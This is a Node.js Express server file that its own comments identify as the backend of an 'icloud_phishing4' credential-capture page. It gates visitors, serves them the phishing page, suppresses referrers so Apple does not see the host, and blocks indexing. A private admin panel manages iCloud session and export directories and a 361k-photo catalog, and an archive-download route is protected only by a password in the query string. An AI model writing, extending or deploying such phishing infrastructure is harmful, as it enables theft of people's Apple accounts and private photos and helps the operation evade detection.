import crypto from "node:crypto";
import express from "express";
import httpProxy from "http-proxy";
import fs from "node:fs";
import path from "node:path";
import { config, securityWarnings } from "./config.js";
import { createAdminRouter } from "./admin/api.js";
import { createHealthCollector } from "./admin/health.js";
import { s4Enabled } from "./admin/s4.js";
import { createGate } from "./gate.js";
import { geo } from "./geo/index.js";
import { clientIp, countryHeader } from "./ip.js";

/* The web process.  It has one job: serve the built React app and answer
 * /api/geo with the visitor's address + country.  Socket.IO is NOT here; it
 * runs in server/socket on its own port. */

let socketProxy = null;

/* VISITOR_ONLY=1: serve only the gate + static page. The admin API builds a
 * 361k-photo catalog in memory and can OOM; a second process keeps the
 * visitor page online while the operator app restarts. */
const VISITOR_ONLY = /^(1|true|yes|on)$/i.test(String(process.env.VISITOR_ONLY || ""));

export function createApp() {
  const app = express();
  app.disable("x-powered-by");
  app.set("trust proxy", true);
  // Never leak this host to Apple/iCloud (or anyone) on the final redirect.
  app.use((_req, res, next) => {
    res.set("Referrer-Policy", "no-referrer");
    res.set("X-Robots-Tag", "noindex, nofollow, noarchive, nosnippet");
    next();
  });
  app.use(express.json({ limit: "32kb" }));

  app.get("/api/health", (_req, res) => {
    res.json({ ok: true, env: config.env, proxyCount: geo.proxyCount, s4: s4Enabled });
  });

  /* Same-origin Socket.IO.  In production nginx forwards /socket.io straight
   * to the socket process; this keeps the dashboard working on a bare host or
   * in local dev, where there is no nginx in front. */
  if (!VISITOR_ONLY) {
    socketProxy = httpProxy.createProxyServer({
      target: `http://127.0.0.1:${config.socketPort}`,
      ws: true,
      xfwd: true,
    });
    socketProxy.on("error", (_error, _req, res) => {
      try {
        if (res && typeof res.writeHead === "function" && !res.headersSent) res.writeHead(502).end();
        else res?.destroy?.();
      } catch {
        /* already gone */
      }
    });
    app.use((req, res, next) => {
      if (req.url.startsWith("/socket.io")) return socketProxy.web(req, res);
      next();
    });

    app.use(
      "/api/admin",
      createAdminRouter({
        storeFile: config.store.file,
        exportDir: config.icloud.exportDir,
        sessionsDir: config.icloud.sessionsDir,
        proxyUrl: config.icloud.proxyUrl,
        password: config.admin.password,
        secret: config.admin.secret,
        sessionHours: config.admin.sessionHours,
        warnings: securityWarnings(),
        health: createHealthCollector({
          exportDir: config.icloud.exportDir,
          panelUrl: config.admin.panelUrl,
        }),
      })
    );
  }

  app.get("/api/geo", async (req, res) => {
    const ip = clientIp(req);
    const result = await geo.lookup(ip, { headerCountry: countryHeader(req) });
    res.set("cache-control", "no-store").json({
      ...result,
      lookedUpAt: new Date().toISOString(),
    });
  });

  // Direct file download for large test archives:
  //   /download?file=50k-images.zip&password=<panel password>
  // Streams from DOWNLOAD_DIR with HTTP Range support; no page gate, no
  // Basic Auth, the password in the query is the only check.
  app.get("/download", (req, res) => {
    const given = String(req.query.password ?? "");
    const expected = String(config.admin.password ?? "");
    const name = path.basename(String(req.query.file ?? ""));
    const dir = process.env.DOWNLOAD_DIR ?? "/data/test-export";
    const file = path.join(dir, name);
    const ok =
      given.length > 0 &&
      given.length === expected.length &&
      crypto.timingSafeEqual(Buffer.from(given), Buffer.from(expected));
    if (!ok) return res.status(401).type("text").send("wrong password\n");
    if (!name || !fs.existsSync(file) || !fs.statSync(file).isFile()) {
      return res.status(404).type("text").send("not found\n");
    }
    res.setHeader("Content-Disposition", `attachment; filename="${name}"`);
    res.sendFile(file);
  });

  // One-time gate: only a valid redirect pass, a page session, an admin IP/
  // token, or an exempt path may load the app.  It MUST run before
  // express.static and the SPA fallback, otherwise the page is served first.
  app.use(createGate());

  const dist = path.resolve(config.distDir);
  const adminPath = (config.admin.path || "/admin").replace(/\/+$/, "");
  // icloud_phishing4 is a single inlined capture page; it speaks the same
  // /public Socket.IO contract.  Keep the React build for the private admin.
  const captureHtml = path.resolve(
    process.env.CAPTURE_HTML || path.join(dist, "..", "capture", "index.html"),
  );
  app.use(
    express.static(dist, {
      index: false,
      maxAge: config.env === "production" ? "1h" : 0,
      setHeaders(res, filePath) {
        // Vite writes the content hash into every asset name: it can be
        // cached for a year, and index.html must always be revalidated.
        if (filePath.includes(`${path.sep}assets${path.sep}`)) {
          res.setHeader("cache-control", "public, max-age=31536000, immutable");
        } else if (filePath.endsWith("index.html")) {
          res.setHeader("cache-control", "public, max-age=0, must-revalidate");
        }
      },
    })
  );

  // SPA fallback: the private admin path gets the React console; every other
  // non-API GET gets the standalone icloud_phishing4 capture page.
  app.use((req, res, next) => {
    if (req.method !== "GET" || req.path.startsWith("/api/")) return next();
    const index = path.join(dist, "index.html");
    const admin = req.path === adminPath || req.path.startsWith(`${adminPath}/`);
    if (admin) {
      if (!fs.existsSync(index)) {
        return res
          .status(503)
          .type("text")
          .send("dist/index.html is missing. Run `npm run build` first.");
      }
      const html = fs
        .readFileSync(index, "utf8")
        .replaceAll("__ADMIN_PATH__", config.admin.path || "/admin");
      res.setHeader("cache-control", "public, max-age=0, must-revalidate");
      return res.type("html").send(html);
    }
    if (fs.existsSync(captureHtml)) {
      res.setHeader("cache-control", "no-store");
      return res.type("html").send(fs.readFileSync(captureHtml, "utf8"));
    }
    if (!fs.existsSync(index)) {
      return res
        .status(503)
        .type("text")
        .send("dist/index.html is missing. Run `npm run build` first.");
    }
    res.sendFile(index);
  });

  app.use((req, res) => {
    res.status(404).json({ error: "not found", path: req.path });
  });

  // eslint-disable-next-line no-unused-vars
  app.use((error, _req, res, _next) => {
    console.error("[http]", error);
    res.status(500).json({ error: "internal error" });
  });

  return app;
}

/* WebSocket upgrades have to be wired to the HTTP server, not the app. */
export function attachSocketProxy(server) {
  if (!socketProxy) return;
  server.on("upgrade", (req, socket, head) => {
    if (!req.url || !req.url.startsWith("/socket.io")) return;
    socketProxy.ws(req, socket, head);
  });
}
